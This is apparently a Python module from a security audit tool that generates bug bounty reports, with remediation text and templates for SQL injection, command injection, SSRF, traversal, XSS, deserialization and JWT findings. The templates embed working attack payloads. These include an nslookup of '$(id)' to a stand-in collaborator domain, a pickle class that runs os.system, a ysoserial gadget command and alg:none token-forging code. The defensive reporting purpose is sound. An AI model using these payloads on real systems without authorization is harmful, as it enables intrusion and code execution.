"""
AuditAgent — submission-ready bug report generation.

Turns a confirmed Finding into a professional bug report matching the
huntr / HackerOne submission template (see
data/notes/docs/reference/bugbounty-deepdive/hunting/TEMPLATE-bug-report.md).

Public API
----------
BugReport          — Pydantic v2 model (source-of-truth for all sections)
build_bug_report   — sync, deterministic; works with zero LLM calls
render_markdown    — clean Markdown a human can paste into huntr/H1
write_reports      — async; emits one report-NN-<slug>.md per eligible finding
                     + index.md; filters to HIGH+CRIT non-FP findings

Optional LLM enrichment
-----------------------
Pass enrich=True to write_reports.  Calls the same run_worker path as
pipeline.py (via _call_llm).  Degrades gracefully when no worker is
available or the call times out — falls back to the deterministic output.

Defensive framing only
----------------------
PoC payloads describe HOW to verify the issue for the asset owner's triager.
They are benign confirm-only demonstrations — no weaponized exploits,
no data exfiltration, no actual RCE execution beyond OOB DNS callbacks in
a lab.  Secret values are always masked (first 4 + last 4 chars).
"""
from __future__ import annotations

import asyncio
import logging
import os
import re
import subprocess
import textwrap
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import TYPE_CHECKING

from pydantic import BaseModel, ConfigDict, Field

from .models import (
    AuditRun,
    Finding,
    Severity,
    VerificationStatus,
    _mask_secret,
)

if TYPE_CHECKING:
    pass  # avoid circular import at type-check time

log = logging.getLogger("jarvis_core.audit_agent.reporting")

# LLM enrich timeout — short; we don't want to block the CLI
_ENRICH_TIMEOUT = int(__import__("os").getenv("AUDIT_ENRICH_TIMEOUT", "45"))


# ── Vuln-class taxonomy ────────────────────────────────────────────────────────


class VulnClass(str, Enum):
    SQLI              = "SQL Injection"
    CMD_INJECTION     = "Command Injection"
    HARDCODED_SECRET  = "Hardcoded Secret"
    SCA_CVE           = "Known Vulnerable Dependency"
    SSRF              = "Server-Side Request Forgery"
    PATH_TRAVERSAL    = "Path Traversal"
    XSS               = "Cross-Site Scripting"
    DESERIALIZATION   = "Unsafe Deserialization"
    JWT               = "JWT Algorithm Confusion"
    XXE               = "XML External Entity"
    GENERIC           = "Security Finding"


# CWE → VulnClass (authoritative first-pass)
_CWE_TO_VULN_CLASS: dict[str, VulnClass] = {
    "CWE-89":  VulnClass.SQLI,
    "CWE-564": VulnClass.SQLI,    # Hibernate injection
    "CWE-78":  VulnClass.CMD_INJECTION,
    "CWE-77":  VulnClass.CMD_INJECTION,
    "CWE-94":  VulnClass.CMD_INJECTION,
    "CWE-79":  VulnClass.XSS,
    "CWE-80":  VulnClass.XSS,     # Basic XSS
    "CWE-918": VulnClass.SSRF,
    "CWE-22":  VulnClass.PATH_TRAVERSAL,
    "CWE-73":  VulnClass.PATH_TRAVERSAL,
    "CWE-35":  VulnClass.PATH_TRAVERSAL,
    "CWE-798": VulnClass.HARDCODED_SECRET,
    "CWE-259": VulnClass.HARDCODED_SECRET,
    "CWE-321": VulnClass.HARDCODED_SECRET,
    "CWE-540": VulnClass.HARDCODED_SECRET,
    "CWE-502": VulnClass.DESERIALIZATION,
    "CWE-347": VulnClass.JWT,
    "CWE-345": VulnClass.JWT,     # Insufficient verification
    "CWE-611": VulnClass.XXE,
    "CWE-776": VulnClass.XXE,
}

# Scanners that always imply SCA_CVE
_SCA_SCANNERS: frozenset[str] = frozenset({"trivy", "osv", "osv-scanner"})

# Scanners that always imply HARDCODED_SECRET
_SECRET_SCANNERS: frozenset[str] = frozenset({"gitleaks", "trufflehog"})

# Rule-ID substring → VulnClass (fallback after CWE + scanner checks)
_RULE_PATTERNS: list[tuple[str, VulnClass]] = [
    ("sqli",          VulnClass.SQLI),
    ("sql-inject",    VulnClass.SQLI),
    ("injection",     VulnClass.SQLI),
    ("cmd-inject",    VulnClass.CMD_INJECTION),
    ("command-inject",VulnClass.CMD_INJECTION),
    ("os-command",    VulnClass.CMD_INJECTION),
    ("xss",           VulnClass.XSS),
    ("cross-site",    VulnClass.XSS),
    ("ssrf",          VulnClass.SSRF),
    ("secret",        VulnClass.HARDCODED_SECRET),
    ("hardcoded",     VulnClass.HARDCODED_SECRET),
    ("apikey",        VulnClass.HARDCODED_SECRET),
    ("api-key",       VulnClass.HARDCODED_SECRET),
    ("password",      VulnClass.HARDCODED_SECRET),
    ("path-trav",     VulnClass.PATH_TRAVERSAL),
    ("traversal",     VulnClass.PATH_TRAVERSAL),
    ("deserializ",    VulnClass.DESERIALIZATION),
    ("pickle",        VulnClass.DESERIALIZATION),
    ("jwt",           VulnClass.JWT),
    ("xxe",           VulnClass.XXE),
    ("xml-inject",    VulnClass.XXE),
]


# ── BugReport Pydantic model ───────────────────────────────────────────────────


class BugReport(BaseModel):
    """Submission-ready bug report derived from one Finding.

    All fields are strings / primitive types — suitable for JSON export and
    Markdown rendering.  frozen=True enforces immutability after construction.
    """

    model_config = ConfigDict(frozen=True)

    finding_id: str
    slug: str               # filename-safe, e.g. "sql-injection-a1b2c3d4"
    audit_id: str
    target_uri: str
    generated_at: datetime = Field(default_factory=datetime.utcnow)

    # ── Header ─────────────────────────────────────────────────────────────
    title: str
    vuln_class: VulnClass

    # ── Severity block ─────────────────────────────────────────────────────
    severity: str            # "Critical" / "High" / "Medium" / ...
    cvss_vector: str | None
    cvss_score: float | None
    severity_justification: str

    # ── Vulnerability details ───────────────────────────────────────────────
    cwe: str | None
    owasp: str | None

    # ── Affected asset ──────────────────────────────────────────────────────
    affected_asset: str     # "path/file.py:42" | "package@1.2.3" | rule_id

    # ── Report body ─────────────────────────────────────────────────────────
    summary: str
    reproduction_steps: list[str]
    proof_of_concept: str
    impact: str
    remediation_primary: str
    remediation_secondary: str

    # ── References ───────────────────────────────────────────────────────────
    references: list[str]

    # ── Submission hint ──────────────────────────────────────────────────────
    platform_hint: str      # "huntr.dev (OSS)" | "HackerOne / Bugcrowd / Intigriti"

    # ── Metadata ─────────────────────────────────────────────────────────────
    llm_enriched: bool = False


# ── Classification helpers ─────────────────────────────────────────────────────


def _classify_finding(finding: Finding) -> VulnClass:
    """Deterministically map a Finding to a VulnClass.

    Priority:
      1. CWE lookup (most authoritative)
      2. Scanner name (SCA / secrets scanners)
      3. Rule-ID substring patterns
      4. GENERIC fallback
    """
    if finding.cwe:
        match = _CWE_TO_VULN_CLASS.get(finding.cwe.upper())
        if match:
            return match

    scanner_low = finding.scanner.lower()
    if scanner_low in _SCA_SCANNERS:
        return VulnClass.SCA_CVE
    if scanner_low in _SECRET_SCANNERS:
        return VulnClass.HARDCODED_SECRET

    rule_low = finding.rule_id.lower()
    for pattern, vc in _RULE_PATTERNS:
        if pattern in rule_low:
            return vc

    return VulnClass.GENERIC


# ── Affected asset builder ─────────────────────────────────────────────────────


def _build_affected_asset(finding: Finding) -> str:
    if finding.file_path:
        base = finding.file_path
        if finding.line_start:
            base = f"{base}:{finding.line_start}"
        return base
    if finding.endpoint:
        return finding.endpoint
    return finding.rule_id


# ── Secret masking in evidence ─────────────────────────────────────────────────

_SECRET_TOKEN_RE = re.compile(r"(?<![A-Za-z0-9_\-])([A-Za-z0-9_\-]{16,})(?![A-Za-z0-9_\-])")


def _mask_evidence_secrets(text: str) -> str:
    """Mask any long alphanumeric tokens that could be credential values."""
    def _replace(m: re.Match) -> str:
        return _mask_secret(m.group(1))
    return _SECRET_TOKEN_RE.sub(_replace, text)


# ── Slug generation ────────────────────────────────────────────────────────────


def _make_slug(vuln_class: VulnClass, finding_id: str) -> str:
    raw = vuln_class.value.lower()
    slug_base = re.sub(r"[^a-z0-9]+", "-", raw).strip("-")
    return f"{slug_base}-{finding_id[:8]}"


# ── CVSS vector fallback ───────────────────────────────────────────────────────


def _resolve_cvss(finding: Finding) -> tuple[str | None, float | None]:
    """Return (vector, score), filling in from normalizer table if missing."""
    if finding.cvss_vector and finding.cvss_score is not None:
        return finding.cvss_vector, finding.cvss_score

    try:
        from .normalizers.cvss import cwe_to_cvss_vector, score_vector, severity_to_default_vector
        vector = cwe_to_cvss_vector(finding.cwe)
        if not vector:
            vector = severity_to_default_vector(finding.severity.value)
        score = score_vector(vector)
        return vector, score
    except Exception:
        return finding.cvss_vector, finding.cvss_score


# ── Per-class builders ─────────────────────────────────────────────────────────
# Each returns a tuple of (summary, repro_steps, poc, impact, fix_primary, fix_secondary)


def _build_sqli(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"SQL injection at `{asset}` allows an attacker to inject arbitrary SQL "
        f"into the query via unsanitized user input, potentially disclosing database "
        f"contents, bypassing authentication, or corrupting data."
    )
    steps = [
        f"Set up the target application with a test database.",
        f"Locate the vulnerable input at `{asset}` (reported by scanner: {finding.scanner}).",
        "Send a request with a boolean-based detection payload in the vulnerable parameter:",
        "    Payload A: `' AND '1'='1'--`  (always-true condition)",
        "    Payload B: `' AND '1'='2'--`  (always-false condition)",
        "Compare the responses — a deterministic content or status difference confirms injection.",
        "If time-based confirmation is needed: `' AND SLEEP(3)--` vs `' AND SLEEP(0)--` "
        "(delay difference ≥ 3 s, repeated 3 times).",
        "Expected: parameterized queries prevent injection. Actual: user input alters query structure.",
        "Note: do not extract data beyond `SELECT VERSION()` for PoC; one non-sensitive field is sufficient.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **Detection payload (Boolean-based):**
        ```sql
        ' AND '1'='1'--    -- true condition
        ' AND '1'='2'--    -- false condition
        ```

        **Vulnerable code / scanner evidence:**
        ```
        {evidence_safe}
        ```

        **Confirmation:** Deterministic response difference between true/false payloads.
        Do NOT use UNION-based or error-based extraction in the PoC — boolean diff is sufficient.
        Do NOT dump tables or extract user data.
    """)
    impact = (
        "An unauthenticated or low-privileged attacker can manipulate SQL queries to: "
        "(1) extract database contents including credentials, PII, and application secrets; "
        "(2) bypass authentication checks; "
        "(3) modify or delete data. "
        "Blast radius depends on database user privileges and schema."
    )
    fix_primary = (
        "Replace all string-concatenation query construction with parameterized queries "
        "(prepared statements). Example: `cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))`. "
        "Never interpolate user input directly into SQL strings."
    )
    fix_secondary = (
        "Enforce least-privilege on the database account (no DROP/ALTER). "
        "Deploy a WAF rule for common SQLi signatures. "
        "Enable query logging and alert on anomalous query shapes."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_cmd_injection(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"Command injection at `{asset}` allows attacker-controlled input to reach a "
        f"shell execution context without sanitization, potentially enabling arbitrary "
        f"operating system command execution."
    )
    steps = [
        f"Locate the command-execution code path at `{asset}`.",
        "Identify the input parameter that reaches the shell call.",
        "Inject a time-based OOB probe to confirm execution without reading output:",
        "    Time-based: append `; sleep 5` and measure the response delay (≥ 5 s confirms).",
        "Repeat the probe with `; sleep 0` as a baseline to rule out network jitter.",
        "For OOB confirmation (preferred): inject `; nslookup $(id).your-collaborator.domain` "
        "and verify the DNS callback contains the command output.",
        "Expected: shell metacharacters are sanitized before subprocess execution. "
        "Actual: the payload executes on the server.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **Time-based detection (benign):**
        ```bash
        ; sleep 5   # append to the vulnerable parameter value
        ; sleep 0   # baseline comparison
        ```

        **OOB confirmation (in controlled lab):**
        ```bash
        ; nslookup $(id).your-interactsh-domain.com
        ```

        **Scanner evidence:**
        ```
        {evidence_safe}
        ```

        **Confirmation:** ≥ 5 s delay for `sleep 5` vs < 1 s for `sleep 0` (repeat 3×).
        Or: DNS callback arrives from target server IP with `id` output embedded.
        Do NOT use destructive payloads (rm, wget reverse shells).
    """)
    impact = (
        "Arbitrary command execution under the server process's OS user account. "
        "Full system compromise, data exfiltration, lateral movement to internal network, "
        "and persistence via cron/authorized_keys are achievable in a real attack."
    )
    fix_primary = (
        "Replace shell-based execution with library-level APIs that do not invoke a shell "
        "(e.g. Python `subprocess.run([cmd, arg], shell=False)`). "
        "If shell execution is required, strictly allowlist input against a controlled set of values. "
        "Never pass user input as a shell argument."
    )
    fix_secondary = (
        "Run the application process under a least-privileged OS user with no shell access. "
        "Apply AppArmor / seccomp profile to restrict allowed system calls."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _is_git_tracked(file_path: str | None) -> bool | None:
    """True if the file is tracked by git, False if not, None if undetermined.

    Accuracy matters: a gitignored `.env.local` is NOT 'committed to the repo' —
    asserting that in a bug report would be a false claim a triager can disprove.
    """
    if not file_path or not os.path.isfile(file_path):
        return None
    try:
        d = os.path.dirname(os.path.abspath(file_path)) or "."
        r = subprocess.run(
            ["git", "ls-files", "--error-unmatch", os.path.abspath(file_path)],
            cwd=d, capture_output=True, timeout=10,
        )
        return r.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return None


def _build_hardcoded_secret(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    masked_evidence = _mask_evidence_secrets(finding.evidence[:400])

    # Try to extract a clean masked value to show
    secret_hint = "[masked — see evidence]"
    m = re.search(r"([A-Za-z0-9_\-]{16,})", finding.evidence)
    if m:
        secret_hint = _mask_secret(m.group(1))

    tracked = _is_git_tracked(finding.file_path)
    if tracked is True:
        exposure = (
            "The value is committed to version control and visible to anyone with "
            "repository read access, enabling direct authentication or impersonation "
            "against the associated service."
        )
    elif tracked is False:
        exposure = (
            "The value sits in plaintext on disk. The file is NOT currently git-tracked "
            "(e.g. a local/gitignored env file), so exposure depends on whether it was "
            "ever committed (verify in step 2) or shipped in a build/artifact — but a "
            "plaintext credential is still a rotation-worthy exposure."
        )
    else:
        exposure = (
            "The value is stored in plaintext, exposing the associated service to direct "
            "authentication or impersonation if the file is committed or otherwise shared."
        )
    summary = f"A hardcoded credential or secret key was found at `{asset}`. {exposure}"
    steps = [
        f"Confirm the secret is present at `{asset}` (scanner: {finding.scanner}, rule: {finding.rule_id}).",
        f"Verify the secret is committed to version history: `git log --all -p -- {finding.file_path or asset} | grep {secret_hint[:8]}`",
        "Identify which service or system the credential authenticates against "
        "(infer from surrounding code or key prefix).",
        "Perform a benign identity check to confirm the credential is currently active:",
        "    AWS key: `aws sts get-caller-identity` (do not access resources).",
        "    Generic token: a read-only API call (e.g. GET /user or /me endpoint).",
        "Document: the key is valid, whether it is committed to history, and the associated service.",
        "Expected: credentials managed via environment variables or a secrets manager. "
        "Actual: plaintext credential in source code.",
        "IMPORTANT: do not use the credential beyond the identity check. Report and rotate immediately.",
    ]
    poc = textwrap.dedent(f"""\
        **Location:** `{asset}`
        **Scanner:** {finding.scanner}  |  **Rule:** {finding.rule_id}

        **Masked secret value:**
        ```
        {secret_hint}
        ```

        **Evidence (masked):**
        ```
        {masked_evidence}
        ```

        **Git history confirmation:**
        ```bash
        git log --all -p -- {finding.file_path or asset}
        ```

        **Confirm active credential (benign identity check only):**
        ```bash
        # Example for AWS — identity echo, no resource access
        AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY=<secret> aws sts get-caller-identity
        ```

        Do NOT use the credential to access, modify, or exfiltrate data.
        Full secret value is withheld from this report; rotate immediately upon triage.
    """)
    impact = (
        "Any party with repository read access — including collaborators, CI/CD systems, "
        "and anyone who has cloned or forked the repo — holds the credential. "
        "The associated service is fully compromised until the credential is rotated. "
        "Historical Git commits preserve the secret even after file deletion."
    )
    fix_primary = (
        "Immediately rotate the exposed credential. "
        "Remove the hardcoded value and replace with an environment variable or secret manager reference "
        "(e.g. AWS Secrets Manager, Vault, Doppler). "
        "Purge the secret from Git history using `git filter-repo` or BFG Repo Cleaner."
    )
    fix_secondary = (
        "Add a pre-commit hook (`gitleaks` or `detect-secrets`) to block future secret commits. "
        "Configure your CI/CD pipeline to fail on secret detection (GitHub Advanced Security / "
        "GitLab Secret Detection). "
        "Audit all forks and clones to determine exposure scope."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_sca_cve(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    # Try to extract CVE or GHSA from rule_id or evidence
    cve_match = re.search(r"(CVE-\d{4}-\d+|GHSA-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})", finding.evidence, re.IGNORECASE)
    cve_id = cve_match.group(1).upper() if cve_match else finding.rule_id
    advisory_url = (
        f"https://github.com/advisories/{cve_id}"
        if cve_id.startswith("GHSA-")
        else f"https://nvd.nist.gov/vuln/detail/{cve_id}"
        if cve_id.startswith("CVE-")
        else "https://osv.dev/"
    )

    # Try to extract package name and version from evidence or rule_id
    pkg_match = re.search(r"([A-Za-z0-9_\-\.]+)[@=]([0-9][^\s,;)]+)", finding.evidence)
    package_info = f"{pkg_match.group(1)}@{pkg_match.group(2)}" if pkg_match else asset

    summary = (
        f"The project depends on `{package_info}`, which contains a known vulnerability ({cve_id}). "
        f"The vulnerable version is present in the dependency manifest and may be reachable "
        f"from application code paths."
    )
    steps = [
        f"Locate `{package_info}` in the project's dependency manifest "
        f"(package.json / requirements.txt / go.mod / pom.xml / etc.).",
        f"Confirm the installed version is in the vulnerable range per advisory: {advisory_url}",
        "Identify where the package is imported in the codebase:",
        f"    `grep -r '{pkg_match.group(1) if pkg_match else 'package'}' --include='*.py' --include='*.js'`",
        "Verify the vulnerable code path is reachable from user-controlled input "
        "(check if the affected function/API is used in a hot path).",
        "Expected: dependency pinned to a patched version. "
        f"Actual: `{package_info}` is in the vulnerable range.",
        "Note: version match against the advisory range is sufficient for confirmation. "
        "No exploitation of the vulnerability is required or permitted.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **Vulnerable dependency:** `{package_info}`
        **Advisory:** [{cve_id}]({advisory_url})
        **Scanner:** {finding.scanner}  |  **Rule:** {finding.rule_id}

        **Scanner evidence:**
        ```
        {evidence_safe}
        ```

        **Verify installed version:**
        ```bash
        # Python
        pip show {pkg_match.group(1) if pkg_match else 'package'} | grep Version

        # Node
        npm list {pkg_match.group(1) if pkg_match else 'package'}

        # Go
        go list -m all | grep {pkg_match.group(1) if pkg_match else 'package'}
        ```

        **Confirm import in codebase:**
        ```bash
        grep -r '{pkg_match.group(1) if pkg_match else 'package'}' . --include='*.py' -l
        ```

        Confirmation: version in vulnerable range + package imported in reachable code = valid finding.
        Do NOT attempt to exploit the CVE; version/usage confirmation is sufficient.
    """)
    impact = (
        f"The vulnerability described in {cve_id} is reachable via the application's dependency on "
        f"`{package_info}`. Impact inherits the CVE's CVSS rating — review the advisory for specific "
        f"attack vectors (RCE / DoS / info-disclosure). Supply-chain vulnerabilities may affect all "
        f"users of the application without any application-level exploitation."
    )
    fix_primary = (
        f"Update `{package_info}` to the patched version specified in the advisory at "
        f"{advisory_url}. "
        f"Run `{finding.scanner} --fix` or update the lock file and re-pin."
    )
    fix_secondary = (
        "Enable automated dependency update PRs (Dependabot / Renovate). "
        "Add SCA scanning (`trivy`, `osv-scanner`) to your CI pipeline as a blocking quality gate. "
        "Review transitive dependencies with `pip-audit` / `npm audit` / `govulncheck`."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_ssrf(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"The application at `{asset}` accepts a user-controlled URL and fetches it "
        f"server-side without an allowlist, enabling SSRF. An attacker can coerce the "
        f"server to reach internal network services, metadata endpoints, or cloud "
        f"credential APIs."
    )
    steps = [
        f"Identify the URL-accepting parameter at `{asset}` (scanner: {finding.scanner}).",
        "Set up a self-hosted OOB callback server (interactsh or Burp Collaborator).",
        "Inject your callback URL into the parameter:",
        "    `http://your-interactsh-domain/ssrf-probe`",
        "Submit the request and monitor for an inbound HTTP or DNS callback.",
        "Confirm the source IP in the callback belongs to the target server, not your browser.",
        "Expected: URL allowlist or SSRF mitigation blocks external fetches. "
        "Actual: server-side HTTP fetch reaches the OOB endpoint.",
        "Note: do NOT probe internal network addresses (169.254.169.254, 10.x, 172.x, 192.168.x) "
        "beyond confirming reachability is the finding.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **OOB callback payload (benign confirmation):**
        ```
        http://your-interactsh-domain.com/ssrf-probe
        ```

        **Insert into:** vulnerable URL parameter at `{asset}`

        **Expected OOB log entry:**
        ```
        [timestamp] HTTP GET /ssrf-probe from <TARGET_SERVER_IP>
        User-Agent: <target app's HTTP client>
        ```

        **Scanner evidence:**
        ```
        {evidence_safe}
        ```

        Confirmation: callback arrives from the target server's IP, proving server-side fetch.
        Do NOT target cloud metadata endpoints (169.254.169.254) or internal IPs in the PoC.
        Reachability proof via OOB is the confirmed finding.
    """)
    impact = (
        "SSRF enables the attacker to use the target server as a proxy to: "
        "(1) enumerate and access internal services not exposed to the internet; "
        "(2) retrieve cloud instance metadata (AWS/GCP/Azure) potentially including IAM credentials; "
        "(3) scan internal network topology. "
        "If IMDSv1 is reachable, full cloud account compromise is possible."
    )
    fix_primary = (
        "Implement a strict URL allowlist: only permit fetching from explicitly approved domains. "
        "Block all requests to RFC1918 ranges (10.x, 172.16-31.x, 192.168.x), loopback, "
        "and link-local (169.254.x) addresses. "
        "Use a DNS resolver that pre-resolves URLs to IPs before the allowlist check to prevent DNS rebinding."
    )
    fix_secondary = (
        "Require IMDSv2 (token-based) on all cloud instances to prevent metadata credential theft. "
        "Run server-side HTTP clients through an egress proxy that enforces the allowlist at the network layer."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_path_traversal(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"A path traversal vulnerability at `{asset}` allows user-controlled path components "
        f"to escape the intended directory, potentially exposing arbitrary files on the server "
        f"including configuration files and credentials."
    )
    steps = [
        f"Identify the file-path parameter at `{asset}` (scanner: {finding.scanner}).",
        "Inject a benign traversal sequence targeting a known safe file:",
        "    Payload: `../../../../etc/hostname`",
        "Compare the response content with a non-traversal baseline request.",
        "If the server returns the hostname (or any content from outside the intended directory), "
        "the traversal is confirmed.",
        "Test URL-encoded variants if plain `../` is filtered: `%2e%2e%2f`, `%252e%252e%252f`.",
        "Expected: path canonicalization rejects out-of-root traversal. "
        "Actual: traversal resolves outside the intended directory.",
        "Note: use `/etc/hostname` (benign, single-line) — NOT `/etc/passwd` or any file with PII.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **Traversal payloads (escalating, benign):**
        ```
        ../../../../etc/hostname          (plain)
        ..%2F..%2F..%2Fetc%2Fhostname    (URL-encoded /)
        %2e%2e%2f%2e%2e%2fetc%2fhostname (percent-encoded ./)
        ```

        **Target file:** `/etc/hostname` — benign, single-line, no PII.
        Do NOT read `/etc/passwd`, `/etc/shadow`, application config files, or keys.

        **Scanner evidence:**
        ```
        {evidence_safe}
        ```

        Confirmation: response contains the server hostname or file content from outside
        the intended base directory.
    """)
    impact = (
        "Arbitrary file read from the server filesystem. "
        "Attackers can read application configuration (database credentials, API keys), "
        "private key files (SSL/SSH), and any file readable by the server process user. "
        "In write-enabled contexts, path traversal enables dropping payloads in executable locations."
    )
    fix_primary = (
        "Canonicalize and validate all file paths against an allowed base directory before opening. "
        "Use `os.path.realpath()` / `Path.resolve()` then confirm the result starts with the expected prefix. "
        "Never construct file paths from user-supplied components."
    )
    fix_secondary = (
        "Run the server process under a least-privileged user with read access only to the "
        "application's own files (not system config). "
        "Apply chroot or container filesystem isolation where possible."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_xss(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"A cross-site scripting vulnerability at `{asset}` allows attacker-controlled "
        f"input to be rendered as executable JavaScript in a victim's browser, enabling "
        f"session hijacking, credential theft, or UI redress."
    )
    steps = [
        f"Locate the input/output point at `{asset}` (scanner: {finding.scanner}).",
        "Inject the detection payload into the vulnerable parameter:",
        "    `<svg onload=\"alert(document.domain)\">`",
        "Load the page in a real browser (not headless) that renders the injected content.",
        "Confirm the `alert()` fires with the correct target origin in the dialog.",
        "Expected: output is contextually encoded (HTML entities, CSP). "
        "Actual: the payload executes as JavaScript in the target origin.",
        "Note: `alert(document.domain)` — NOT `alert(document.cookie)` or any exfil payload.",
        "Confirm the alert fires in the target origin, not `about:blank` or a sandboxed iframe.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **Detection payload (benign confirmation):**
        ```html
        <svg onload="alert(document.domain)">
        ```

        **Alternate polyglot (for attribute/JS context):**
        ```html
        "><svg onload=alert(document.domain)>
        ';alert(document.domain)//
        ```

        **Scanner evidence (code-level sink):**
        ```
        {evidence_safe}
        ```

        **Confirmation:** `alert()` fires in a real browser with the target's `document.domain`.
        Do NOT use `document.cookie`, `fetch()`, or any exfiltration payload.
        Do NOT use an automated headless tool for confirmation — browser rendering is required.
    """)
    impact = (
        "A victim visiting a page with the injected payload executes attacker-controlled JavaScript "
        "in the target origin. This enables: session token theft (via `document.cookie`), "
        "credential harvesting (keylogging the login form), account takeover, "
        "and UI redress (phishing overlay). "
        "Stored XSS affects all users who view the page."
    )
    fix_primary = (
        "Apply context-aware output encoding before rendering user-controlled data in HTML. "
        "Use the framework's built-in templating engine (React JSX / Angular templates / "
        "Django autoescape / Jinja2) which encodes by default. "
        "Never use `innerHTML`, `document.write`, or `v-html` with unsanitized input."
    )
    fix_secondary = (
        "Deploy a strict Content Security Policy (`script-src 'self'`) to reduce XSS exploitability. "
        "Set cookies with `HttpOnly; Secure; SameSite=Strict` to prevent JS session theft."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_deserialization(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"Unsafe deserialization at `{asset}` allows attacker-controlled serialized data "
        f"to be deserialized by the application, potentially triggering gadget chains that "
        f"lead to arbitrary code execution."
    )
    steps = [
        f"Locate the deserialization call at `{asset}` (scanner: {finding.scanner}, rule: {finding.rule_id}).",
        "Identify the serialization library in use (Python pickle, Java ObjectInputStream, "
        "PHP unserialize, .NET BinaryFormatter) from the evidence.",
        "Confirm that the deserialized data is user-controlled (reaches the call from a network input).",
        "In a controlled lab environment, generate an OOB DNS-callback gadget chain:",
        "    Java: `ysoserial CommonsCollections6 'nslookup your-collab.domain'`",
        "    PHP: `PHPGGC <framework> <chain> 'nslookup your-collab.domain'`",
        "Submit the gadget to the endpoint and verify the OOB DNS callback arrives from the target.",
        "Expected: deserialization only accepts signed/typed data from trusted sources. "
        "Actual: attacker-controlled serialized blob is deserialized without verification.",
        "CRITICAL: use OOB DNS callback only — do NOT execute destructive commands. "
        "Stop after confirming RCE via DNS; do not proceed to a shell.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **Vulnerable deserialization detected at:** `{asset}`
        **Scanner:** {finding.scanner}  |  **Rule:** {finding.rule_id}

        **Scanner evidence (magic bytes / unsafe call):**
        ```
        {evidence_safe}
        ```

        **OOB confirmation only (lab environment):**
        ```bash
        # Java — Commons Collections gadget → OOB DNS
        java -jar ysoserial.jar CommonsCollections6 'nslookup <id>.your-collab.domain' > payload.ser

        # Python pickle — OOB DNS callback
        import pickle, os
        class Exploit(object):
            def __reduce__(self):
                return (os.system, ('nslookup $(id).your-collab.domain',))
        ```

        **Confirmation:** DNS callback from target server IP proves arbitrary code execution.
        Do NOT use destructive payloads. Stop at OOB DNS — no shell access, no data exfil.
        This PoC is for authorized lab environments only.
    """)
    impact = (
        "Arbitrary code execution under the server process's OS user. "
        "Full system compromise, lateral movement, persistence, and data exfiltration are achievable. "
        "No authentication is required if the deserialization endpoint is reachable unauthenticated."
    )
    fix_primary = (
        "Do not deserialize user-controlled data. If deserialization is required, "
        "use safe alternatives: JSON (with schema validation), HMAC-signed serialized payloads "
        "where the signature is verified before deserialization, or typed deserialization "
        "(Java: Jackson with explicit type binding; Python: restrict pickle to trusted-source only). "
        "Never use Java `ObjectInputStream`, Python `pickle.loads`, or PHP `unserialize` "
        "on untrusted data."
    )
    fix_secondary = (
        "Deploy a Java deserialization filter (`ObjectInputFilter`) to block known gadget classes. "
        "Apply serialization agent (`javaagent:notsoserial.jar`) to deny-list known gadget namespaces. "
        "Run the application under a least-privileged process user with no network egress."
    )
    return summary, steps, poc, impact, fix_primary, fix_secondary


def _build_jwt(finding: Finding, asset: str) -> tuple[str, list[str], str, str, str, str]:
    summary = (
        f"A JWT validation weakness at `{asset}` may allow an attacker to forge tokens "
        f"through algorithm confusion or signature bypass, leading to authentication bypass "
        f"or privilege escalation."
    )
    steps = [
        f"Obtain a valid JWT from the application (authenticate with a test account).",
        f"Decode the token header using `jwt_tool` or https://jwt.io.",
        "Test the `alg:none` bypass: change `'alg'` to `'none'` and strip the signature component.",
        "Replay the modified token to an authenticated endpoint.",
        "If `alg: RS256` is present, test RS256 → HS256 confusion:",
        "    Re-sign the token with HS256 using the application's **public key** as the HMAC secret.",
        "Test weak HMAC secrets: `hashcat -m 16500 <token> wordlist.txt` (your own account token only).",
        "Expected: token signature validated against a known, algorithm-specific key. "
        "Actual: modified or forged token is accepted.",
        "Note: test only against your own test account — never against other users' sessions.",
    ]
    evidence_safe = _mask_evidence_secrets(finding.evidence[:300])
    poc = textwrap.dedent(f"""\
        **JWT weakness detected at:** `{asset}`
        **Scanner:** {finding.scanner}  |  **Rule:** {finding.rule_id}

        **Scanner evidence:**
        ```
        {evidence_safe}
        ```

        **alg:none bypass test:**
        ```python
        import base64, json

        # 1. Decode the original token (no verification)
        header, payload, sig = token.split('.')

        # 2. Modify the header
        h = json.loads(base64.b64decode(header + '=='))
        h['alg'] = 'none'
        new_header = base64.b64encode(json.dumps(h).encode()).rstrip(b'=').decode()

        # 3. Rebuild with empty signature
        forged_token = f"{{new_header}}.{{payload}}."
        ```

